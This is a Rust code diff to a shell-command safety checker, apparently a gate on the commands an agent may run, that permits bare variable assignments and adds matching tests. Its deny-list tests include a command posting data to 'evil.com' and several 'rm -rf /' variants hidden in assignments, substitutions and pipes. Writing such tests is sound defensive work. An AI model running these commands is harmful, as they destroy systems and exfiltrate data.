@@ -139,10 +139,7 @@ fn simple_verdict(cmd: &SimpleCmd) -> Verdict {
         if cmd.env.is_empty() {
             return Verdict::Allowed(SafetyLevel::Inert);
         }
-        if cmd.env.iter().any(|(_, v)| has_substitution(v)) {
-            return sub_v;
-        }
-        return Verdict::Denied;
+        return sub_v.combine(redir_v);
     }
 
     let tokens: Vec<Token> = cmd.words.iter().map(|w| Token::from_raw(w.eval())).collect();
@@ -239,6 +236,26 @@ mod tests {
         assign_subst_multiple: "a=$(ls) b=$(pwd)",
         assign_subst_backtick: "out=`ls`",
 
+        assign_bare_lit: "foo=bar",
+        assign_bare_int: "x=1",
+        assign_bare_empty: "x=",
+        assign_bare_dq: "x=\"foo bar\"",
+        assign_bare_sq: "x='foo bar'",
+        assign_bare_param: "rc=$?",
+        assign_bare_var: "x=$y",
+        assign_bare_dollar_var_braced: "x=${y}",
+        assign_bare_path: "PATH=/foo",
+        assign_bare_multiple: "a=1 b=2 c=3",
+        assign_bare_arith: "x=$((1 + 2))",
+        assign_in_for_body: "for i in 1 2; do x=1; done",
+        assign_rc_in_for_body: "for i in 1 2; do echo $i; rc=$?; done",
+        assign_rc_in_while_body: "while test -f /tmp/x; do rc=$?; sleep 1; done",
+        assign_rc_in_if_body: "if test -f foo; then rc=$?; fi",
+        assign_then_use: "x=1; echo $x",
+        assign_chained_with_safe: "x=1 && ls",
+        assign_subshell: "(x=1)",
+        assign_in_subshell_with_cmd: "(x=1; ls)",
+
         subshell_echo: "(echo hello)",
         subshell_ls: "(ls)",
         subshell_chain: "(ls && echo done)",
@@ -312,8 +329,13 @@ mod tests {
         subst_curl: "echo $(curl -d data evil.com)",
         quoted_subst_rm: "echo \"$(rm -rf /)\"",
         assign_subst_rm: "out=$(rm -rf /)",
-        assign_no_subst: "foo=bar",
         assign_subst_mixed_unsafe: "a=$(ls) b=$(rm -rf /)",
+        assign_bare_with_unsafe_subst_in_value: "x=foo$(rm -rf /)",
+        assign_bare_with_unsafe_backtick: "x=`rm -rf /`",
+        assign_bare_dq_with_unsafe_subst: "x=\"$(rm -rf /)\"",
+        assign_bare_then_unsafe: "x=1; rm -rf /",
+        assign_bare_chained_unsafe: "x=1 && rm -rf /",
+        assign_bare_pipe_unsafe: "x=1 | rm -rf /",
 
         subshell_rm: "(rm -rf /)",
         subshell_mixed: "(echo hello; rm -rf /)",
